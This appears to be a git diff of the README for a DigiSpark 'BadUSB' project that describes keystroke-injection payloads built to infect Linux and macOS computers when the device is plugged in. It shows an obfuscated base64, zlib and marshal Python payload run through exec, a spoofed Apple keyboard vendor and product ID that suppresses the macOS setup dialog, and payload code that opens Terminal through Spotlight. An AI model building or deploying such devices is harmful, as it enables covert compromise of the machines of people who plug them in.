@@ -29,7 +29,7 @@ We've then configured the Arduino IDE to include the DigiSpark board, so that we
 
 ### Linux Payload
 
-The following code is what we've developed thus far to infect Linux machines upon plugin.
+The following code is what we've developed to infect Linux machines upon plugin.
 
 ```c
 #include "DigiKeyboard.h"
@@ -97,7 +97,7 @@ exec(eval(marshal.loads(zlib.decompress(base64.b64decode('eJwrtmBgYCgtyskvSM3TUM
 ### Mac (OSX) Payload
 In order to prevent the keyboard configuration dialog box from appearing when the DigiSpark is plugged into an Apple computer, we must configure the DigiSpark to appear as if it's an Apple keyboard.
 
-VID and PID are defined in the file `~/.arduino15/packages/digistump/hardware/avr/1.6.7/libraries/DigisparkKeyboard/usbconfig.h`. We will replace the existing file with our [modified Apple version](./scripts/usbconfig.h) when compiling the script for OSX. When we change Vendor Name and Device Name, we also have to adapt the constants for the name length.
+VID and PID are defined in the file `~/.arduino15/packages/digistump/hardware/avr/1.6.7/libraries/DigisparkKeyboard/usbconfig.h`. We will replace the existing file with our [modified Apple version](./scripts/Digispark/usbconfig.h) when compiling the script for OSX. When we change Vendor Name and Device Name, we also have to adapt the constants for the name length.
 
 The following code is what we've developed thus far to infect Apple OSX machines upon plugin.  
 ```c
@@ -111,10 +111,9 @@ The following code is what we've developed thus far to infect Apple OSX machines
  ***/
 
 #define MOD_CMD_LEFT 0x00000008
-boolean do_hack = true;
 
 void setup() {
-  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(2000);
   DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
   DigiKeyboard.print("terminal");
